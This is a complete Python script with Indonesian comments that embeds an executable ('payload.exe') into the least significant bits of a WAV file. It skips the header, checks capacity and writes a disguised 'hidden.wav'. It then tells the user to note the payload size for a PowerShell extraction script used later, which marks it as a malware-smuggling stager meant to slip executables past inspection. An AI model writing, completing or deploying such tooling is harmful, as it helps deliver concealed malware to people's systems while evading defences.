import os

def embed_lsb(cover_audio_path, payload_path, output_path):
    # 1. Baca Payload
    try:
        with open(payload_path, 'rb') as f:
            payload_data = f.read()
    except FileNotFoundError:
        print(f"[!] Payload {payload_path} tidak ditemukan.")
        return

    payload_len = len(payload_data)
    print(f"[*] Ukuran Payload: {payload_len} bytes")
    
    # Konversi payload ke list of bits
    payload_bits = []
    for byte in payload_data:
        for i in range(7, -1, -1):
            payload_bits.append((byte >> i) & 1)

    # 2. Baca Cover Audio
    with open(cover_audio_path, 'rb') as f:
        audio_bytes = bytearray(f.read())

    # Header WAV standar adalah 44 byte
    header_len = 44
    max_capacity = len(audio_bytes) - header_len

    print(f"[*] Kapasitas Audio: {max_capacity // 8} bytes")

    if len(payload_bits) > max_capacity:
        print("[!] Error: File audio terlalu kecil untuk menampung payload ini.")
        return

    print("[*] Memulai penyisipan LSB...")

    # 3. Proses Penyisipan (Melewati 44 byte pertama)
    for i in range(len(payload_bits)):
        # Posisi byte audio dimulai dari index 44
        audio_index = header_len + i
        
        # Logika LSB:
        # Clear bit terakhir (AND 0xFE) lalu set dengan bit payload (OR bit)
        audio_bytes[audio_index] = (audio_bytes[audio_index] & 0xFE) | payload_bits[i]

    # 4. Simpan Hasil
    with open(output_path, 'wb') as f:
        f.write(audio_bytes)
    
    print(f"[+] Berhasil! File tersimpan di: {output_path}")
    print(f"[+] PENTING: Catat ukuran payload ({payload_len} bytes) untuk script PowerShell nanti.")

# KONFIGURASI FILE
# Pastikan nama file sesuai dengan yang ada di folder kamu
embed_lsb('music.wav', 'payload.exe', 'hidden.wav')